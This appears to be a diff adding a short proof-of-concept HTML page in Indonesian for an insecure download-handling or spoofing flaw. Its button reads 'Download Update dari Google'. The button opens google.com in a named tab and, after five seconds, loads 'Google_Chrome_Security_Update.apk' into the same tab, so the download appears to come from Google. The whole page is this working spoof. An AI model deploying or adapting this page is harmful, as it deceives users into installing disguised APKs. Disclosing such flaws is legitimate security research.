@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PoC Insecure Download Handling</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #f0f0f0;
+      }
+      .btn {
+        background-color: #4caf50;
+        border: none;
+        color: white;
+        padding: 20px 40px;
+        font-size: 18px;
+        border-radius: 8px;
+        cursor: pointer;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+      .btn:active {
+        background-color: #45a049;
+        transform: translateY(2px);
+      }
+    </style>
+  </head>
+  <body>
+    <button class="btn" onclick="triggerSpoof()">
+      Download Update dari Google
+    </button>
+
+    <script>
+      function triggerSpoof() {
+        const targetWindow = window.open("https://www.google.com", "spoof_tab");
+
+        setTimeout(function () {
+          window.open("Google_Chrome_Security_Update.apk", "spoof_tab");
+        }, 5000);
+      }
+    </script>
+  </body>
+</html>
